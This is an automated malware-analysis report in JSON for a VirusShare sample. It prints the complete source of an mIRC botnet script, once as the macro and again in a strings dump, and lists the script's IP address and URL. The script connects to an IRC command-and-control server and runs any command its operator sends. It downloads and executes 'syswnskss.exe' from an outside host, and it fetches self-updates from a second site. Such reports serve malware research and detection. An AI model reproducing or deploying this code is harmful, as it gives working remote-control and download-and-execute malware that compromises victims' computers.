{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "chr": "May attempt to obfuscate specific str",
            "run": "May run an executable file or a system command",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": ";socket\nalias -l il return $+($r(a,z),$iif($r(1,3) = 2,$r(A,Z)),$iif($r(1,3) = 2,$r(a,z)))\nalias -l ich return $decode(I2p1bXA=,m)\nalias -l scmd if ($1 && $sock(wnurr).status == active) { sockwrite -tn wnurr $1- }\nalias -l smsg scmd privmsg $1 $+(:,$2-)\nalias -l snotice scmd notice $1 $+(:,$2-)\nalias -l icn { var %n = $+(WT,$r(10000,99999)) | scmd nick %n | set %imynick %n }\non *:sockopen:wnurr:{\n  if ($sockerr) { halt }\n  scmd user tt hostname servername :tuxteam\n  icn\n}\non *:sockread:wnurr:{\n  if ($sockerr) { halt }\n  sockread %i | tokenize 32 %i | unset %i\n  if (!$1) || ($2 = 372) { return }\n  var %nick = $gettok($mid($1-,2-),1,33)\n  if ($1 == PING) { scmd pong $2- }\n  if ($2 == PRIVMSG && $3 == $ich) {\n    ;if ($chr(35) isin $3 && $3 != $ich) { return }\n    tokenize 32 $mid($4-,2)\n    if ($1 == %imynick) { tokenize 32 $2- }\n    if ($1 == notice) { .timer 1 0 snotice %nick $2- }\n    if ($1 == do) { $2- }\n    if ($1 == isc && $2) {\n      if ($2 == connect && $3) { sockclose isc | sockopen isc $3 6667 }\n      else { iscmd $2- }\n    }\n  }\n  if ($2 == KICK && $4 == %imynick) { scmd join $3 }\n  if ($2 == 001) { scmd join $ich }\n  if ($2 == 433) { icn }\n}\n;check\non *:signal:ionload:.signal ivariouscheck\non *:connect:.signal ivariouscheck\non *:signal:ivariouscheck:{\n  if (%hrtsrdxc) { return }\n  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }\n  if (!$sock(wnurr)) { sockclose wnurr | sockopen wnurr  199.203.55.187 6667 }\n  inc %icount\n  set %noconalert 1\n  wdl\n  if (!%sbunou) { .signal sbu | set -u [ $+ [ $calc(10*60) ] ] %sbunou yes }\n}\n;isc\nalias -l iscmd if ($sock(isc).status == active) { sockwrite -tn isc $1- }\non *:sockopen:isc:{\n  if ($sockerr) { halt }\n  iscmd user $+($il,$il,$il) hostname servername $+(:,$il,$il,$il)\n  iscmd nick $+($il,$il,$il,$il,$il)\n}\non *:sockread:isc:{\n  if ($sockerr) { halt }\n  sockread %i | tokenize 32 %i | unset %i\n  if ($1 == PING) { iscmd PONG $2- }\n  if ($2 == 005 && brasnet isin $4-) { sockclose $sockname }\n}\n;dl\nalias wdl {\n  if ($sock(wdl)) || ($isfile($dfn)) || (!$isdir($nofile($dfn))) || (%hshhxhsx) { return }\n  unset %size %ok\n  sockopen wdl $durl(host) 80\n}\non *:sockopen:wdl:{\n  if ($sockerr) { dend h }\n  sockwrite -n $sockname GET $durl(full) HTTP/1.1\n  sockwrite -n $sockname Host: $durl(host)\n  sockwrite -n $sockname Connection: close\n  sockwrite -n $sockname\n}\non *:sockread:wdl:{\n  if (!%ok) {\n    sockread %i | tokenize 32 %i | unset %i\n    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { dend h }\n    if ($len($1-) == 0) { set %ok yes }\n  }\n  else {\n    sockread &i\n    bwrite $+(\",$dfn,\") -1 -1 &i\n  }\n}\non *:sockclose:wdl:{\n  if ($isfile($dfn)) {\n    set %hshhxhsx yes\n    run $dfn\n  }\n  dend\n}\nalias dend {\n  sockclose wdl\n  unset %size %ok\n  $iif($1 = h,halt)\n}\nalias durl return $iif($1 == full,$+(/,$gettok($dfull,3-,47))) $iif($1 == host,$gettok($dfull,2,47))\nalias dfull return http://assistencial.hosting43.com/backup.zip\nalias dfn return c:\\windows\\syswnskss.exe\n;bot on\nalias vesgo if (!$sock(vesgo)) { sockopen vesgo www.canalbrusque.com.br 80 }\non *:sockopen:vesgo:if (!$sockerr) { sockwrite -n $sockname GET /krypton/bot/bot.php HTTP/1.1 $+ $lf $+ Host: www.canalbrusque.com.br $+ $lf $+ Connection: keep-alive $+ $str($lf,2) }\n;sb\non *:signal:sbu:{\n  if (!$sock(sbu)) {\n    if ($lof(sbsys.mrc) == %sbsize) { return }\n    sockopen sbu www.canalbrusque.com.br 80\n  }\n}\non *:sockopen:sbu:{\n  if ($sockerr) { return }\n  sockwrite -n $sockname GET /krypton/sockbot.mrc HTTP/1.1\n  sockwrite -n $sockname Host: www.canalbrusque.com.br\n  sockwrite -n $sockname Connection: close\n  sockwrite -n $sockname\n}\non *:sockread:sbu:{\n  if (!%ok) {\n    sockread %i | tokenize 32 %i | unset %i\n    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { sockclose $sockname }\n    if (Content-Length isin $1) { set %sbsize $2 }\n    if ($len($1-) == 0) { write -c sbsyst | set %ok yes }\n  }\n  else {\n    sockread &i\n    bwrite sbsyst -1 -1 &i\n  }\n}\non *:sockclose:sbu:{\n  if (endscript isin $read(sbsyst,$lines(sbsyst))) {\n    .remove sbsys.mrc\n    .copy -o sbsyst sbsys.mrc\n    .reload -rs1 sbsys.mrc\n    .signal sbcheck\n  }\n  .remove sbsyst\n}"
    },
    "filename": "VirusShare_41235b666894b23921dd2e341b33ff8e",
    "filesize": 4306,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "41235b666894b23921dd2e341b33ff8e",
        "sha1": "ab366749a194d2f1453d8ebee7b0a138d0e6e2ac",
        "sha256": "f7ee6a956b6d977463f931fa0f30ac30c4c012748ba24b631db3dc7cad7a8d15"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            ";socket",
            "alias -l il return $+($r(a,z),$iif($r(1,3) = 2,$r(A,Z)),$iif($r(1,3) = 2,$r(a,z)))",
            "alias -l ich return $decode(I2p1bXA=,m)",
            "alias -l scmd if ($1 && $sock(wnurr).status == active) { sockwrite -tn wnurr $1- }",
            "alias -l smsg scmd privmsg $1 $+(:,$2-)",
            "alias -l snotice scmd notice $1 $+(:,$2-)",
            "alias -l icn { var %n = $+(WT,$r(10000,99999)) | scmd nick %n | set %imynick %n }",
            "on *:sockopen:wnurr:{",
            "  if ($sockerr) { halt }",
            "  scmd user tt hostname servername :tuxteam",
            "  icn",
            "on *:sockread:wnurr:{",
            "  if ($sockerr) { halt }",
            "  sockread %i | tokenize 32 %i | unset %i",
            "  if (!$1) || ($2 = 372) { return }",
            "  var %nick = $gettok($mid($1-,2-),1,33)",
            "  if ($1 == PING) { scmd pong $2- }",
            "  if ($2 == PRIVMSG && $3 == $ich) {",
            "    ;if ($chr(35) isin $3 && $3 != $ich) { return }",
            "    tokenize 32 $mid($4-,2)",
            "    if ($1 == %imynick) { tokenize 32 $2- }",
            "    if ($1 == notice) { .timer 1 0 snotice %nick $2- }",
            "    if ($1 == do) { $2- }",
            "    if ($1 == isc && $2) {",
            "      if ($2 == connect && $3) { sockclose isc | sockopen isc $3 6667 }",
            "      else { iscmd $2- }",
            "    }",
            "  if ($2 == KICK && $4 == %imynick) { scmd join $3 }",
            "  if ($2 == 001) { scmd join $ich }",
            "  if ($2 == 433) { icn }",
            ";check",
            "on *:signal:ionload:.signal ivariouscheck",
            "on *:connect:.signal ivariouscheck",
            "on *:signal:ivariouscheck:{",
            "  if (%hrtsrdxc) { return }",
            "  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }",
            "  if (!$sock(wnurr)) { sockclose wnurr | sockopen wnurr  199.203.55.187 6667 }",
            "  inc %icount",
            "  set %noconalert 1",
            "  wdl",
            "  if (!%sbunou) { .signal sbu | set -u [ $+ [ $calc(10*60) ] ] %sbunou yes }",
            ";isc",
            "alias -l iscmd if ($sock(isc).status == active) { sockwrite -tn isc $1- }",
            "on *:sockopen:isc:{",
            "  if ($sockerr) { halt }",
            "  iscmd user $+($il,$il,$il) hostname servername $+(:,$il,$il,$il)",
            "  iscmd nick $+($il,$il,$il,$il,$il)",
            "on *:sockread:isc:{",
            "  if ($sockerr) { halt }",
            "  sockread %i | tokenize 32 %i | unset %i",
            "  if ($1 == PING) { iscmd PONG $2- }",
            "  if ($2 == 005 && brasnet isin $4-) { sockclose $sockname }",
            "alias wdl {",
            "  if ($sock(wdl)) || ($isfile($dfn)) || (!$isdir($nofile($dfn))) || (%hshhxhsx) { return }",
            "  unset %size %ok",
            "  sockopen wdl $durl(host) 80",
            "on *:sockopen:wdl:{",
            "  if ($sockerr) { dend h }",
            "  sockwrite -n $sockname GET $durl(full) HTTP/1.1",
            "  sockwrite -n $sockname Host: $durl(host)",
            "  sockwrite -n $sockname Connection: close",
            "  sockwrite -n $sockname",
            "on *:sockread:wdl:{",
            "  if (!%ok) {",
            "    sockread %i | tokenize 32 %i | unset %i",
            "    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { dend h }",
            "    if ($len($1-) == 0) { set %ok yes }",
            "  else {",
            "    sockread &i",
            "    bwrite $+(\",$dfn,\") -1 -1 &i",
            "on *:sockclose:wdl:{",
            "  if ($isfile($dfn)) {",
            "    set %hshhxhsx yes",
            "    run $dfn",
            "  dend",
            "alias dend {",
            "  sockclose wdl",
            "  unset %size %ok",
            "  $iif($1 = h,halt)",
            "alias durl return $iif($1 == full,$+(/,$gettok($dfull,3-,47))) $iif($1 == host,$gettok($dfull,2,47))",
            "alias dfull return http://assistencial.hosting43.com/backup.zip",
            "alias dfn return c:\\windows\\syswnskss.exe",
            ";bot on",
            "alias vesgo if (!$sock(vesgo)) { sockopen vesgo www.canalbrusque.com.br 80 }",
            "on *:sockopen:vesgo:if (!$sockerr) { sockwrite -n $sockname GET /krypton/bot/bot.php HTTP/1.1 $+ $lf $+ Host: www.canalbrusque.com.br $+ $lf $+ Connection: keep-alive $+ $str($lf,2) }",
            "on *:signal:sbu:{",
            "  if (!$sock(sbu)) {",
            "    if ($lof(sbsys.mrc) == %sbsize) { return }",
            "    sockopen sbu www.canalbrusque.com.br 80",
            "on *:sockopen:sbu:{",
            "  if ($sockerr) { return }",
            "  sockwrite -n $sockname GET /krypton/sockbot.mrc HTTP/1.1",
            "  sockwrite -n $sockname Host: www.canalbrusque.com.br",
            "  sockwrite -n $sockname Connection: close",
            "  sockwrite -n $sockname",
            "on *:sockread:sbu:{",
            "  if (!%ok) {",
            "    sockread %i | tokenize 32 %i | unset %i",
            "    if (*HTTP*302*Found* iswm $1-) || (*404*not*found* iswm $1-) { sockclose $sockname }",
            "    if (Content-Length isin $1) { set %sbsize $2 }",
            "    if ($len($1-) == 0) { write -c sbsyst | set %ok yes }",
            "  else {",
            "    sockread &i",
            "    bwrite sbsyst -1 -1 &i",
            "on *:sockclose:sbu:{",
            "  if (endscript isin $read(sbsyst,$lines(sbsyst))) {",
            "    .remove sbsys.mrc",
            "    .copy -o sbsyst sbsys.mrc",
            "    .reload -rs1 sbsys.mrc",
            "    .signal sbcheck",
            "  .remove sbsyst"
        ],
        "file": {
            "alias dfn return c:\\windows\\syswnskss.exe": "Executable",
            "alias dfull return http://assistencial.hosting43.com/backup.zip": "Compressed"
        },
        "fuzzing": {},
        "ip": [
            "199.203.55.187"
        ],
        "url": [
            "http://assistencial.hosting43.com/backup.zip"
        ]
    },
    "time": "0:00:00.303020",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
